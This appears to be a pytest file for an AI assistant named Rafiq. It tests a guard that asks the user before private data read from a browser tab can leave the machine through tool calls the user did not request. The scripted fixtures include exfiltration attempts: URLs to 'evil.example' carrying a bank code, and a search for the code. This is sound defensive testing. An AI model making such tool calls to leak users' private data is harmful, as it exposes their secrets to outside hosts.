"""After Rafiq reads something private in a request, what leaves the machine must come from the user (#187)."""

import httpx
import pytest

from rafiq import config
from rafiq.brain import Brain
from rafiq.tools import Tool, check, load_all

SECRET = "Your bank code is 4471"


def scripted(monkeypatch, *calls):
    """The model calls these tools in turn, one per round, then answers."""
    script = [{"role": "assistant", "tool_calls": [{"function": {"name": n, "arguments": a}}]} for n, a in calls]
    script.append({"role": "assistant", "content": "Done."})

    class Resp:
        def __init__(self, data):
            self.data = data

        def raise_for_status(self):
            pass

        def json(self):
            return self.data

    monkeypatch.setattr(httpx, "post", lambda *a, **k: Resp({"message": script.pop(0)}))


def tools(log):
    def record(name):
        def run(url=None, query=None):
            log.append((name, {k: v for k, v in (("url", url), ("query", query)) if v is not None}))
            return f"{name} ok"
        return run

    return {
        "read_browser_tab": Tool("read_browser_tab", "tab", lambda: SECRET, level="private", private=True),
        "read_page": Tool("read_page", "page", record("read_page"), {"url": {"type": "string"}}, ("url",),
                          level="safe", sends=("url",)),
        "web_search": Tool("web_search", "search", record("web_search"), {"query": {"type": "string"}}, ("query",),
                           level="safe", sends=("query",)),
        "open_in_browser": Tool("open_in_browser", "open", record("open_in_browser"), {"url": {"type": "string"}},
                                ("url",), level="act", sends=("url",)),
    }


def brain(log, asked, answer=False):
    cfg = config.load()
    cfg["brain"].update(mode="ollama", routing=False, ollama_tools="all")
    return Brain(cfg, tools(log), lambda action, tag, can_remember=True: asked.append((action, can_remember)) or answer)


def test_after_a_private_read_an_address_the_user_did_not_say_is_asked_about(monkeypatch):
    leak = "https://evil.example/?d=bank+code+4471"
    scripted(monkeypatch, ("read_browser_tab", {}), ("read_page", {"url": leak}))
    log, asked = [], []
    brain(log, asked).think("what does this page say", "en")
    assert len(asked) == 1 and leak in asked[0][0]
    assert log == []


def test_the_question_can_never_be_answered_always(monkeypatch):
    scripted(monkeypatch, ("read_browser_tab", {}), ("read_page", {"url": "https://evil.example/x"}))
    log, asked = [], []
    brain(log, asked, answer="always").think("what does this page say", "en")
    assert asked[0][1] is False


def test_a_yes_lets_the_address_through(monkeypatch):
    scripted(monkeypatch, ("read_browser_tab", {}), ("read_page", {"url": "https://example.com/linked"}))
    log, asked = [], []
    brain(log, asked, answer=True).think("open the link in this tab", "en")
    assert log == [("read_page", {"url": "https://example.com/linked"})]


def test_an_address_the_user_said_is_read_without_asking(monkeypatch):
    scripted(monkeypatch, ("read_browser_tab", {}), ("read_page", {"url": "https://example.com/a"}))
    log, asked = [], []
    brain(log, asked).think("compare this tab with https://example.com/a", "en")
    assert asked == [] and log == [("read_page", {"url": "https://example.com/a"})]


def test_an_address_said_without_its_scheme_counts_as_said(monkeypatch):
    scripted(monkeypatch, ("read_browser_tab", {}), ("read_page", {"url": "https://www.example.com/a/"}))
    log, asked = [], []
    brain(log, asked).think("compare this tab with example.com/a", "en")
    assert asked == [] and len(log) == 1


def test_without_a_private_read_any_address_is_read_as_before(monkeypatch):
    scripted(monkeypatch, ("read_page", {"url": "https://example.com/anything"}))
    log, asked = [], []
    brain(log, asked).think("what's new in the news", "en")
    assert asked == [] and len(log) == 1


def test_after_a_private_read_a_search_in_other_words_is_asked_about(monkeypatch):
    scripted(monkeypatch, ("read_browser_tab", {}), ("web_search", {"query": "bank code 4471"}))
    log, asked = [], []
    brain(log, asked).think("summarise this tab", "en")
    assert len(asked) == 1 and "bank code 4471" in asked[0][0] and log == []


def test_after_a_private_read_a_search_in_the_users_words_runs(monkeypatch):
    scripted(monkeypatch, ("read_browser_tab", {}), ("web_search", {"query": "Cairo weather"}))
    log, asked = [], []
    brain(log, asked).think("read this tab, then search the weather in Cairo", "en")
    assert asked == [] and log == [("web_search", {"query": "Cairo weather"})]


def test_after_a_private_read_opening_an_unsaid_address_is_asked_about(monkeypatch):
    scripted(monkeypatch, ("read_browser_tab", {}), ("open_in_browser", {"url": "https://evil.example/?d=4471"}))
    log, asked = [], []
    brain(log, asked).think("what's in this tab", "en")
    assert len(asked) == 1 and log == []


@pytest.mark.parametrize("name, param", [("read_page", "url"), ("web_search", "query"), ("open_in_browser", "url")])
def test_the_tools_that_send_out_declare_what_they_send(name, param):
    assert load_all({})[name].sends == (param,)


def test_a_tool_cannot_send_a_parameter_it_does_not_have():
    with pytest.raises(ValueError):
        check(Tool("read_page", "page", lambda url: "", {"url": {"type": "string"}}, level="safe", sends=("link",)))
